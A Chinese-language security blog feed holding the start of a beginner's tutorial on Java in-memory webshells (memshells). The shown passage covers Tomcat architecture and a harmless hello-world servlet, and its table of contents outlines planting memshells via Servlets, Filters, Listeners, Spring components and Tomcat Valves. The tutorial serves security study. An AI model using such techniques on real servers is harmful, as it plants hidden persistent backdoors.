<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>W01fh4cker&#39;s blog</title>
  
  
  <link href="https://w01fh4cker.github.io/atom.xml" rel="self"/>
  
  <link href="https://w01fh4cker.github.io/"/>
  <updated>2024-12-30T06:12:51.923Z</updated>
  <id>https://w01fh4cker.github.io/</id>
  
  <author>
    <name>W01fh4cker</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>完全零基础从0到1掌握Java内存马</title>
    <link href="https://w01fh4cker.github.io/2024/12/30/LearnJavaMemshellFromZero/"/>
    <id>https://w01fh4cker.github.io/2024/12/30/LearnJavaMemshellFromZero/</id>
    <published>2024-12-30T06:04:53.000Z</published>
    <updated>2024-12-30T06:12:51.923Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://socialify.git.ci/W01fh4cker/LearnJavaMemshellFromZero/image?description=1&descriptionEditable=%E3%80%90%E5%8E%9F%E5%88%9B%E3%80%91%E5%AE%8C%E5%85%A8%E9%9B%B6%E5%9F%BA%E7%A1%80%E4%BB%8E0%E5%88%B01%E6%8E%8C%E6%8F%A1Java%E5%86%85%E5%AD%98%E9%A9%AC&forks=1&issues=1&language=1&logo=https://s2.loli.net/2022/06/25/gUAh2V5CiD96y8G.jpg&owner=1&pattern=Brick%20Wall&pulls=1&stargazers=1"> </p><span id="more"></span><p>本文目录：</p><ul><li><a href="#%E4%B8%80%E5%89%8D%E8%A8%80">一、前言</a></li><li><a href="#%E4%BA%8C%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">二、前置知识</a><ul><li><a href="#21-servlet%E5%AE%B9%E5%99%A8%E4%B8%8Eenginehostcontext%E5%92%8Cwrapper">2.1 Servlet容器与Engine、Host、Context和Wrapper</a></li><li><a href="#22-%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84servlet">2.2 编写一个简单的servlet</a></li><li><a href="#23-%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E7%9C%8Bservlet%E5%88%9D%E5%A7%8B%E5%8C%96%E4%B8%8E%E8%A3%85%E8%BD%BD%E6%B5%81%E7%A8%8B">2.3 从代码层面看servlet初始化与装载流程</a><ul><li><a href="#231-servlet%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">2.3.1 servlet初始化流程分析</a></li><li><a href="#232-servlet%E8%A3%85%E8%BD%BD%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">2.3.2 servlet装载流程分析</a></li></ul></li><li><a href="#24-filter%E5%AE%B9%E5%99%A8%E4%B8%8Efilterdefsfilterconfigsfiltermapsfilterchain">2.4 Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain</a></li><li><a href="#25-%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84filter">2.5 编写一个简单的Filter</a></li><li><a href="#26-%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E5%88%86%E6%9E%90filter%E8%BF%90%E8%A1%8C%E7%9A%84%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B">2.6 从代码层面分析Filter运行的整体流程</a></li><li><a href="#27-listener%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D">2.7 Listener简单介绍</a></li><li><a href="#28-%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84listenerservletrequestlistener">2.8 编写一个简单的Listener（ServletRequestListener）</a></li><li><a href="#29-%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E5%88%86%E6%9E%90listener%E8%BF%90%E8%A1%8C%E7%9A%84%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B">2.9 从代码层面分析Listener运行的整体流程</a></li><li><a href="#210-%E7%AE%80%E5%8D%95%E7%9A%84spring%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BA">2.10 简单的spring项目搭建</a><ul><li><a href="#2101-%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84spring-controller">2.10.1 编写一个简单的Spring Controller</a></li><li><a href="#2102-%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84spring-interceptor">2.10.2 编写一个简单的Spring Interceptor</a></li><li><a href="#2103-%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84spring-webflux%E7%9A%84demo%E5%9F%BA%E4%BA%8Enetty">2.10.3 编写一个简单的Spring WebFlux的Demo（基于Netty）</a></li></ul></li><li><a href="#211-spring-mvc%E4%BB%8B%E7%BB%8D">2.11 Spring MVC介绍</a><ul><li><a href="#2111-spring-mvc%E4%B9%9D%E5%A4%A7%E7%BB%84%E4%BB%B6">2.11.1 Spring MVC九大组件</a></li><li><a href="#2112-%E7%AE%80%E5%8D%95%E7%9A%84%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90">2.11.2 简单的源码分析</a><ul><li><a href="#21121-%E4%B9%9D%E5%A4%A7%E7%BB%84%E4%BB%B6%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96">2.11.2.1 九大组件的初始化</a></li><li><a href="#21122-url%E5%92%8Ccontroller%E7%9A%84%E5%85%B3%E7%B3%BB%E7%9A%84%E5%BB%BA%E7%AB%8B">2.11.2.2 url和Controller的关系的建立</a></li><li><a href="#21123-spring-interceptor%E5%BC%95%E5%85%A5%E4%B8%8E%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">2.11.2.3 Spring Interceptor引入与执行流程分析</a></li></ul></li></ul></li><li><a href="#212-spring-webflux%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90">2.12 Spring WebFlux介绍与代码调试分析</a><ul><li><a href="#2121-%E4%BB%80%E4%B9%88%E6%98%AFmono">2.12.1 什么是Mono？</a></li><li><a href="#2122-%E4%BB%80%E4%B9%88%E6%98%AFflux">2.12.2 什么是Flux？</a></li><li><a href="#2123-spring-webflux%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90">2.12.3 Spring WebFlux启动过程分析</a></li><li><a href="#2124-spring-webflux%E8%AF%B7%E6%B1%82%E5%A4%84%E7%90%86%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90">2.12.4 Spring WebFlux请求处理过程分析</a></li><li><a href="#2125-spring-webflux%E8%BF%87%E6%BB%A4%E5%99%A8webfilter%E8%BF%90%E8%A1%8C%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90">2.12.5 Spring WebFlux过滤器WebFilter运行过程分析</a></li></ul></li><li><a href="#213-tomcat-valve%E4%BB%8B%E7%BB%8D%E4%B8%8E%E8%BF%90%E8%A1%8C%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90">2.13 Tomcat Valve介绍与运行过程分析</a><ul><li><a href="#2131-valve%E4%B8%8Epipeline">2.13.1 Valve与Pipeline</a></li><li><a href="#2132-%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95tomcat-valve%E7%9A%84demo">2.13.2 编写一个简单Tomcat Valve的demo</a></li><li><a href="#2133-tomcat-valve%E6%89%93%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90">2.13.3 Tomcat Valve打入内存马思路分析</a></li></ul></li><li><a href="#214-tomcat-upgrade%E4%BB%8B%E7%BB%8D%E4%B8%8E%E6%89%93%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90">2.14 Tomcat Upgrade介绍与打入内存马思路分析</a><ul><li><a href="#2141-%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84tomcat-upgrade%E7%9A%84demo">2.14.1 编写一个简单的Tomcat Upgrade的demo</a><ul><li><a href="#21411-%E5%88%A9%E7%94%A8springboot%E6%90%AD%E5%BB%BA">2.14.1.1 利用SpringBoot搭建</a></li><li><a href="#21412-%E5%88%A9%E7%94%A8tomcat%E6%90%AD%E5%BB%BA">2.14.1.2 利用Tomcat搭建</a></li></ul></li><li><a href="#2142-tomcat-upgrade%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D%E4%B8%8E%E7%9B%B8%E5%85%B3%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90">2.14.2 Tomcat Upgrade内存马介绍与相关代码调试分析</a></li></ul></li><li><a href="#215-tomcat-executor%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D%E4%B8%8E%E6%89%93%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90">2.15 Tomcat Executor内存马介绍与打入内存马思路分析</a><ul><li><a href="#2151">2.15.1</a></li><li><a href="#2152-tomcat-executor%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90">2.15.2 Tomcat Executor内存马介绍与代码调试分析</a><ul><li><a href="#21521-endpoint%E4%BA%94%E5%A4%A7%E7%BB%84%E4%BB%B6">2.15.2.1 Endpoint五大组件</a></li><li><a href="#21522-endpoint%E5%88%86%E7%B1%BB">2.15.2.2 Endpoint分类</a></li><li><a href="#21523-executor%E7%9B%B8%E5%85%B3%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90">2.15.2.3 Executor相关代码分析</a></li></ul></li></ul></li></ul></li><li><a href="#%E4%B8%89%E4%BC%A0%E7%BB%9Fweb%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">三、传统Web型内存马</a><ul><li><a href="#31-servlet%E5%86%85%E5%AD%98%E9%A9%AC">3.1 Servlet内存马</a><ul><li><a href="#311-%E7%AE%80%E5%8D%95%E7%9A%84servlet%E5%86%85%E5%AD%98%E9%A9%ACdemo%E7%BC%96%E5%86%99">3.1.1 简单的servlet内存马demo编写</a></li><li><a href="#312-servlet%E5%86%85%E5%AD%98%E9%A9%ACdemo%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90">3.1.2 servlet内存马demo代码分析</a></li><li><a href="#313-%E5%85%B3%E4%BA%8Estandardcontextapplicationcontextservletcontext%E7%9A%84%E7%90%86%E8%A7%A3">3.1.3 关于StandardContext、ApplicationContext、ServletContext的理解</a></li></ul></li><li><a href="#32-filter%E5%86%85%E5%AD%98%E9%A9%AC">3.2 Filter内存马</a><ul><li><a href="#321-%E7%AE%80%E5%8D%95%E7%9A%84filter%E5%86%85%E5%AD%98%E9%A9%ACdemo%E7%BC%96%E5%86%99">3.2.1 简单的filter内存马demo编写</a></li><li><a href="#322-servlet%E5%86%85%E5%AD%98%E9%A9%ACdemo%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90">3.2.2 servlet内存马demo代码分析</a></li><li><a href="#323-tomcat6%E4%B8%8Bfilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E7%BC%96%E5%86%99">3.2.3 tomcat6下filter内存马的编写</a></li></ul></li><li><a href="#33-listener%E5%86%85%E5%AD%98%E9%A9%AC">3.3 Listener内存马</a><ul><li><a href="#331-%E7%AE%80%E5%8D%95%E7%9A%84listener%E5%86%85%E5%AD%98%E9%A9%ACdemo%E7%BC%96%E5%86%99">3.3.1 简单的Listener内存马demo编写</a></li><li><a href="#332-listener%E5%86%85%E5%AD%98%E9%A9%ACdemo%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90">3.3.2 Listener内存马demo代码分析</a></li></ul></li></ul></li><li><a href="#%E5%9B%9Bspring-mvc%E6%A1%86%E6%9E%B6%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">四、Spring MVC框架型内存马</a><ul><li><a href="#41-spring-controller%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">4.1 Spring Controller型内存马</a><ul><li><a href="#411-%E7%AE%80%E5%8D%95%E7%9A%84spring-controller%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%ACdemo%E7%BC%96%E5%86%99">4.1.1 简单的Spring Controller型内存马demo编写</a></li><li><a href="#412-spring-controller%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%ACdemo%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90">4.1.2 Spring Controller型内存马demo代码分析</a></li></ul></li><li><a href="#42-spring-interceptor%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">4.2 Spring Interceptor型内存马</a></li><li><a href="#43-spring-webflux%E5%86%85%E5%AD%98%E9%A9%AC">4.3 Spring WebFlux内存马</a><ul><li><a href="#431-%E7%AE%80%E5%8D%95%E7%9A%84spring-webflux%E5%86%85%E5%AD%98%E9%A9%ACdemo%E7%BC%96%E5%86%99">4.3.1 简单的Spring WebFlux内存马demo编写</a></li><li><a href="#432-spring-webflux%E5%86%85%E5%AD%98%E9%A9%ACdemo%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90">4.3.2 Spring WebFlux内存马demo代码分析</a></li></ul></li></ul></li><li><a href="#%E4%BA%94%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">五、中间件型内存马</a><ul><li><a href="#51-tomcat-valve%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">5.1 Tomcat Valve型内存马</a></li><li><a href="#52-tomcat-upgrade%E5%86%85%E5%AD%98%E9%A9%AC">5.2 Tomcat Upgrade内存马</a></li><li><a href="#53-tomcat-executor%E5%86%85%E5%AD%98%E9%A9%AC">5.3 Tomcat Executor内存马</a></li></ul></li><li><a href="#%E5%85%AD%E8%87%B4%E8%B0%A2">六、致谢</a></li></ul><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>&ensp;&ensp;&ensp;&ensp;之前写的零基础学<code>Fastjson</code>的文章反响很不错，很多师傅在公众号后台和我的微信私聊我表示感谢，其实也没啥，大家都是零基础过来的。网上的文章多而杂，并且只有少部分文章是配图清楚、文字描述清晰的，很多时候新手学着学着可能就因为作者的某一个地方没有描述清楚而不知其所指，非常痛苦；亦或是文章面向对象不同，前置知识不扎实导致很多东西无法理解，这些痛点我都曾经历过。但是随着看过的代码逐渐增多，见识逐渐丰富，调试的次数越多，对各种问题的处理就会越得心应手。<br>&ensp;&ensp;&ensp;&ensp;本文所讨论的<code>Java</code>内存马是<code>Java</code>安全中的一个不可或缺的板块，它内容丰富绮丽，研究起来让人着迷，沉沦其中流连忘返。我参考了<code>su18</code>师傅一年多以前发表在<code>Goby</code>社区的这篇文章（<code>https://nosec.org/home/detail/5049.html</code>）中给出的分类方式，把整个零基础掌握<code>java</code>内存马系列分成了以下几个部分：传统<code>web</code>型、<code>spring</code>系列框架型、中间件型、其他内存马（<code>Websocket/Jsp/线程型/RMI</code>）、<code>Agent</code>型内存马、实战内存马打入（<code>Jetty</code>&#x2F;<code>Weblogic</code>&#x2F;<code>Shiro</code>&#x2F;<code>Struts2</code>&#x2F;<code>GlassFish</code>&#x2F;<code>xxl-job</code>…）和内存马。<br>&ensp;&ensp;&ensp;&ensp;好了，让我们闲话少叙，就此开始。</p><h1 id="二、前置知识"><a href="#二、前置知识" class="headerlink" title="二、前置知识"></a>二、前置知识</h1><p>本篇文章除特殊说明外，使用的是<code>jdk1.8.0_202</code>+ <code>tomcat 9.0.85</code>，后者下载地址为：</p><blockquote><p><a href="https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.85/bin/apache-tomcat-9.0.85-windows-x64.zip%E3%80%82">https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.85/bin/apache-tomcat-9.0.85-windows-x64.zip。</a></p></blockquote><h2 id="2-1-Servlet容器与Engine、Host、Context和Wrapper"><a href="#2-1-Servlet容器与Engine、Host、Context和Wrapper" class="headerlink" title="2.1 Servlet容器与Engine、Host、Context和Wrapper"></a>2.1 Servlet容器与Engine、Host、Context和Wrapper</h2><p>这部分我找了好久，终于在一大堆高深&#x2F;垃圾的文章中邂逅了一篇写的还算简明扼要易于理解的文章。</p><blockquote><p> 原文地址：<a href="https://www.maishuren.top/archives/tomcat-zhong-servlet-rong-qi-de-she-ji-yuan-li">https://www.maishuren.top/archives/tomcat-zhong-servlet-rong-qi-de-she-ji-yuan-li</a></p></blockquote><p>这里组合引用其原文，简单概括，就是：</p><p><code>Tomcat</code>设计了四种容器，分别是<code>Engine</code>、<code>Host</code>、<code>Context</code>和<code>Wrapper</code>，其关系如下：<br><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/20240112165508.png"></p><p>这一点可以从<code>Tomcat</code>的配置文件<code>server.xml</code>中看出来。</p><p>此时，设想这样一个场景：我们此时要访问<code>https://manage.xxx.com:8080/user/list</code>，那<code>tomcat</code>是如何实现请求定位到具体的<code>servlet</code>的呢？为此<code>tomcat</code>设计了<code>Mapper</code>，其中保存了容器组件与访问路径的映射关系。</p><p>然后就开始四步走：</p><ol><li><p>根据协议和端口号选定<code>Service</code>和<code>Engine</code>。</p><p>我们知道<code>Tomcat</code>的每个连接器都监听不同的端口，比如<code>Tomcat</code>默认的<code>HTTP</code>连接器监听<code>8080</code>端口、默认的<code>AJP</code>连接器监听<code>8009</code>端口。上面例子中的URL访问的是<code>8080</code>端口，因此这个请求会被<code>HTTP</code>连接器接收，而一个连接器是属于一个<code>Service</code>组件的，这样<code>Service</code>组件就确定了。我们还知道一个<code>Service</code>组件里除了有多个连接器，还有一个容器组件，具体来说就是一个<code>Engine</code>容器，因此<code>Service</code>确定了也就意味着<code>Engine</code>也确定了。</p></li><li><p>根据域名选定<code>Host</code>。</p><p><code>Service</code>和<code>Engine</code>确定后，<code>Mapper</code>组件通过<code>url</code>中的域名去查找相应的<code>Host</code>容器，比如例子中的<code>url</code>访问的域名是<code>manage.xxx.com</code>，因此<code>Mapper</code>会找到<code>Host1</code>这个容器。</p></li><li><p>根据<code>url</code>路径找到<code>Context</code>组件。</p><p><code>Host</code>确定以后，<code>Mapper</code>根据<code>url</code>的路径来匹配相应的<code>Web</code>应用的路径，比如例子中访问的是<code>/user</code>，因此找到了<code>Context1</code>这个<code>Context</code>容器。</p></li><li><p>根据<code>url</code>路径找到<code>Wrapper</code>（<code>Servlet</code>）。</p><p><code>Context</code>确定后，<code>Mapper</code>再根据<code>web.xml</code>中配置的<code>Servlet</code>映射路径来找到具体的<code>Wrapper</code>和<code>Servlet</code>，例如这里的<code>Wrapper1</code>的<code>/list</code>。</p></li></ol><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/20240112165824.png"></p><p>这里的<code>Context</code>翻译过来就是上下文，它包括<code>servlet</code>运行的基本环境；这里的<code>Wrapper</code>翻译过来就是包装器，它负责管理一个<code>servlet</code>，包括其装载、初始化、执行和资源回收。</p><p>关于上图中的连接器的设计，可以继续参考该作者的博文：</p><blockquote><p><a href="https://www.maishuren.top/archives/yi-bu-bu-dai-ni-le-jie-tomcat-zhong-de-lian-jie-qi-shi-ru-he-she-ji-de">https://www.maishuren.top/archives/yi-bu-bu-dai-ni-le-jie-tomcat-zhong-de-lian-jie-qi-shi-ru-he-she-ji-de</a></p></blockquote><p>写到后面之后我又发现了一篇写的极佳的文章，贴在这儿供大家参考，讲的是关于<code>tomcat</code>架构的原理解析：</p><blockquote><p><a href="https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09">https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09</a></p></blockquote><h2 id="2-2-编写一个简单的servlet"><a href="#2-2-编写一个简单的servlet" class="headerlink" title="2.2 编写一个简单的servlet"></a>2.2 编写一个简单的servlet</h2><p><code>pom.xml</code>文件如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servletMemoryShell<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同步下依赖：<br><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112174417723.png"></p><p><code>TestServlet.java</code>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后配置项目运行所需的<code>tomcat</code>环境：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112174451460.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112174520045.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112174543728.png"></p><p>然后配置<code>artifacts</code>，直接点击<code>fix</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112174604960.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112174718456.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112174740574.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112174840311.png"></p><p>然后添加<code>web</code>模块：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112175314298.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112175906956.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112181600664.png"></p><p>运行之后，访问<a href="http://localhost:8080/testServlet/test%EF%BC%9A">http://localhost:8080/testServlet/test：</a></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112181649265.png"></p><h2 id="2-3-从代码层面看servlet初始化与装载流程"><a href="#2-3-从代码层面看servlet初始化与装载流程" class="headerlink" title="2.3 从代码层面看servlet初始化与装载流程"></a>2.3 从代码层面看servlet初始化与装载流程</h2><p>主要参考文章：</p><blockquote><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/">https://longlone.top/安全/java/java安全/内存马/Tomcat-Servlet型/</a></p></blockquote><p>我们这里不采用我们下载的<code>tomcat</code>来运行我们的项目，我们使用嵌入式<code>tomcat</code>也就是所谓的<code>tomcat-embed-core</code>。关于动态调试，我是图省事，直接用<code>tomcat-embed-core</code>，你当然也可以调试直接调试<code>tomcat</code>源码，环境搭建方法可以参考<code>Skay</code>师傅的文章：</p><blockquote><p><a href="https://mp.weixin.qq.com/s/DMVcqtiNG9gMdrBUyCRCgw">https://mp.weixin.qq.com/s/DMVcqtiNG9gMdrBUyCRCgw</a></p></blockquote><p>我们重开一个项目，文件代码如下：</p><p><code>pom.xml</code>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 